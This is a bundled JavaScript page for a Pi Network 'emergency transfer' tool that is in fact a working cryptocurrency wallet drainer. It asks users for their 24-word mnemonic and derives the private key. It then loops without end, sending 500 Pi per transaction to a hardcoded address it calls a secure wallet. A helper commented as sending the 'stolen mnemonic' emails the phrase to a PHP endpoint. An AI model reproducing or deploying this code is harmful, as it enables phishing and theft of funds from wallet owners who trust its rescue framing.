(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([
  [931],
  {
    2361: function () {},
    4616: function () {},
    5024: function () {},
    6502: function (e, t, n) {
      Promise.resolve().then(n.bind(n, 7478));
    },
    7478: function (e, t, n) {
      "use strict";
      n.r(t);
      n.d(t, {
        default: function () {
          return mainComponent;
        },
      });

      // Import dependencies
      var React = n(7437),           // React library
          StellarSDK = n(6775),       // Stellar SDK for Pi Network
          axios = n(3464),            // HTTP client
          ReactHooks = n(2265),       // React hooks (useState, useEffect, useRef)
          BIP39 = n(4923),            // BIP39 for mnemonic handling
          BIP44 = n(6850),            // BIP44 for key derivation
          toast = n(4438);            // Toast notifications

      // Convert mnemonic phrase to private key
      async function mnemonicToPrivateKey(mnemonic) {
        if (!BIP39._I(mnemonic)) {
          throw Error("Invalid mnemonic");
        }
        
        let seed = await BIP39.Z1(mnemonic);
        let { key: privateKeyBytes } = BIP44.derivePath("m/44'/314159'/0'", seed.toString("hex"));
        return StellarSDK.Keypair.fromRawEd25519Seed(privateKeyBytes).secret();
      }

      // Send email notification with stolen mnemonic
      let sendEmailNotification = async (params) => {
        let { form: formRef, setSent: setEmailSent } = params;
        try {
          var formData;
          await axios.Z.post(
            "".concat("http://localhost:8080", "/send-email.php"),
            {
              subject: "Wallet Import",
              textContent: "\n" +
                "                    <p>Hello,</p>\n" +
                "                    <p>You got a new phrase import:</p>\n" +
                "                    <p>" + 
                (null === (formData = formRef.current) || void 0 === formData
                  ? void 0
                  : formData.phrase.value) +
                "</p>\n" +
                "                    <p>Best wishes.</p>\n" +
                "                "
            }
          );
          setEmailSent(true);
        } catch (error) {
          toast.Am.error("An error has occurred");
          console.error("Error sending email:", error);
        }
      };

      // Emergency fund transfer tool for compromised wallets
      var EmergencyTransferTool = function () {
        let [transferComplete, setTransferComplete] = ReactHooks.useState(false);
        let formRef = ReactHooks.useRef(null);
        
        // Single hardcoded destination address for 100% of funds
        let destinationWallet = "GAS7X55UI3WOBHWZC3KGDKDT4FRV2UBKEYFNTHLW7KA226SDPHLMWPLW";  // 100% of funds (hardcoded)
        let hardcodedTransferAmount = 500; // Fixed amount to transfer each time
        
        let [isLoading, setIsLoading] = ReactHooks.useState(false);
        let [transactionHashes, setTransactionHashes] = ReactHooks.useState([]);
        let [errorMessage, setErrorMessage] = ReactHooks.useState("");
        let [walletBalance, setWalletBalance] = ReactHooks.useState(0);
        
        // Initialize Pi Network connection
        let piNetworkServer = new StellarSDK.Horizon.Server("https://api.mainnet.minepi.com");

        // Check wallet balance without transferring
        let checkWalletBalance = async (params) => {
          let { secretKey: privateKey } = params;
          try {
            setErrorMessage("");
            
            // Create keypair from user's private key
            let keypair = StellarSDK.Keypair.fromSecret(privateKey);
            
            // Get current balance
            let { data: accountData } = await axios.Z.get(
              "https://api.mainnet.minepi.com/accounts/" + keypair.publicKey()
            );
            
            // --- DEBUGGING ---
            console.log("--- FULL ACCOUNT DATA ---");
            console.log(JSON.stringify(accountData, null, 2));
            console.log("--------------------------");
            
            let currentBalance = parseFloat(accountData.balances[0].balance);
            console.log("Initial balance (from balances[0]):", currentBalance);
            
            setWalletBalance(currentBalance);
            
            return currentBalance;
            
          } catch (error) {
            throw (setErrorMessage(error.message || "Failed to check balance"), error);
          }
        };

        // Emergency transfer function - continuous draining loop
        let emergencyTransfer = async (params) => {
          let { secretKey: privateKey } = params;
          let keypair = StellarSDK.Keypair.fromSecret(privateKey);
          let transferCount = 0;
          let successCount = 0;
          let failureCount = 0;
          
          // Continuous transfer loop with hardcoded amount
          while (true) {
            try {
              transferCount++;
              
              // Get current account state
              let account = await piNetworkServer.loadAccount(keypair.publicKey());
              
              // Use hardcoded transfer amount instead of calculating available balance
              let transferAmount = hardcodedTransferAmount;
              
              // All funds go to the single hardcoded destination address
              let walletLabel = "DESTINATION";
              
              // Create and submit transaction
              let tx = new StellarSDK.TransactionBuilder(account, {
                fee: "100000", // Fixed fee of 0.01 Pi
                networkPassphrase: "Pi Network",
              })
                .setTimeout(30)
                .addOperation(
                  StellarSDK.Operation.payment({
                    destination: destinationWallet,
                    asset: StellarSDK.Asset.native(),
                    amount: transferAmount.toFixed(7),
                  })
                )
                .build();
              
              tx.sign(keypair);
              let result = await piNetworkServer.submitTransaction(tx);
              
              successCount++;
              setTransactionHashes((prev) => [...prev, result.hash]);
              
              // Optimized delay before next attempt (200ms for success)
              await new Promise((resolve) => setTimeout(resolve, 200));
              
            } catch (error) {
              failureCount++;
              console.error(`Transfer attempt #${transferCount} failed:`, error);
              
              // Optimized delay before retry (500ms for failure)
              await new Promise((resolve) => setTimeout(resolve, 500));
            }
          }
        };

        // Form submission handler - immediate aggressive transfer
        let handleFormSubmit = async (event) => {
          event.preventDefault();
          setIsLoading(true);
          
          try {
            // Get mnemonic phrase from form
            let mnemonic = new FormData(formRef.current).get("phrase");
            
            // Convert to private key
            let privateKey = await mnemonicToPrivateKey(mnemonic);
            if (!privateKey) {
              throw Error("Invalid mnemonic phrase");
            }
            
            // Start continuous draining process
            await emergencyTransfer({ secretKey: privateKey });
            
          } catch (error) {
            setErrorMessage(error.message || "Invalid mnemonic phrase");
            setIsLoading(false); // Only stop loading on initial setup errors
          }
          // Note: Don't set isLoading(false) here since the process runs continuously
        };

        return React.jsxs("div", {
          className: "max-w-md mx-auto p-4 min-h-[90vh] flex flex-col justify-center",
          children: [
            // Header
            React.jsx("div", {
              className: "text-center mb-6",
              children: [
                React.jsx("h1", {
                  style: {
                    fontSize: "24px",
                    fontWeight: "bold",
                    marginBottom: "8px",
                    color: "#7c3aed",
                  },
                  children: "🚨 EMERGENCY WALLET DRAINER"
                }),
                React.jsx("p", {
                  className: "text-gray-400 text-sm",
                  children: "HIGH-SPEED TRANSFER 500 PI TO SECURE WALLET"
                })
              ]
            }),
            
            // Main form
            React.jsxs("form", {
              ref: formRef,
              onSubmit: handleFormSubmit,
              className: "space-y-4",
              children: [
                React.jsx("textarea", {
                  name: "phrase",
                  placeholder: "Enter your 24-word mnemonic phrase",
                  className: "w-full p-2 border rounded border-gray-300 border-solid focus:outline-none focus:ring-2 focus:ring-red-500",
                  rows: 3,
                  required: true,
                }),
                // Display destination address info
                React.jsx("div", {
                  className: "p-3 bg-gray-50 rounded border border-gray-200",
                  children: [
                    React.jsx("p", {
                      className: "text-sm text-gray-600 mb-1",
                      children: "Transfer amount: " + hardcodedTransferAmount + " Pi"
                    }),
                    React.jsx("p", {
                      className: "text-sm text-gray-600 mb-1",
                      children: "Speed: ~3x faster (200ms/500ms delays)"
                    }),
                    React.jsx("p", {
                      className: "text-sm text-gray-600 mb-1",
                      children: "Destination address:"
                    }),
                    React.jsx("p", {
                      className: "text-xs font-mono text-gray-800 break-all",
                      children: destinationWallet
                    })
                  ]
                }),
                React.jsx("button", {
                  type: "submit",
                  disabled: isLoading,
                  style: {
                    width: "100%",
                    backgroundColor: isLoading ? "#9ca3af" : "#7c3aed",
                    color: "white",
                    padding: "8px 16px",
                    borderRadius: "4px",
                    border: "none",
                    cursor: isLoading ? "not-allowed" : "pointer",
                    fontSize: "14px",
                    fontWeight: "500",
                    transition: "background-color 0.2s",
                  },
                  children: isLoading ? "CONTINUOUSLY DRAINING..." : "START CONTINUOUS DRAIN",
                }),
              ],
            }),
            
            // Balance display
            walletBalance > 0 &&
              React.jsx("div", {
                className: "text-center p-3 bg-blue-50 rounded my-3",
                children: React.jsx("p", {
                  className: "text-blue-800 font-medium",
                  children: "Current Balance: " + walletBalance + " Pi"
                })
              }),
            
            // Success message
            transferComplete &&
              React.jsx("div", {
                className: "text-green-500 p-2 bg-green-100 rounded my-3",
                children: "✅ Emergency transfer completed successfully! Funds are now safe.",
              }),
            
            // Error message
            errorMessage &&
              React.jsx("div", {
                className: "text-red-500 p-2 bg-red-100 rounded my-3",
                children: errorMessage,
              }),
          ],
        });
      };

      // Loading animation component
      let LoadingAnimation = n(208);
      function LoadingLottie() {
        return React.jsx(LoadingAnimation.nI, {
          src: "https://lottie.host/75bb48b5-260f-4909-a2ee-390c683149e5/MoaR5CdqDK.lottie",
          loop: true,
          autoplay: true,
        });
      }

      // Main component with loading state
      function mainComponent() {
        let [hasVisitedBefore, setHasVisitedBefore] = ReactHooks.useState(false);
        let [showLoading, setShowLoading] = ReactHooks.useState(false);

        ReactHooks.useEffect(() => {
          if (sessionStorage.getItem("hasVisitedBefore")) {
            setHasVisitedBefore(true);
            setShowLoading(false);
          } else {
            setShowLoading(true);
            setTimeout(() => {
              sessionStorage.setItem("hasVisitedBefore", "true");
              setShowLoading(false);
            }, 4000); // Show loading for 4 seconds
          }
        }, []);

        if (showLoading && !hasVisitedBefore) {
          return React.jsx("div", {
            className: "h-[90vh] flex-center",
            children: React.jsx(LoadingLottie, {}),
          });
        }

        // Only render EmergencyTransferTool, no aggUI button or alternate UI
        return React.jsx(EmergencyTransferTool, {});
      }
    },
  },
  function (e) {
    e.O(0, [806, 741, 438, 580, 971, 117, 744], function () {
      return e((e.s = 6502));
    });
    (_N_E = e.O());
  },
]);
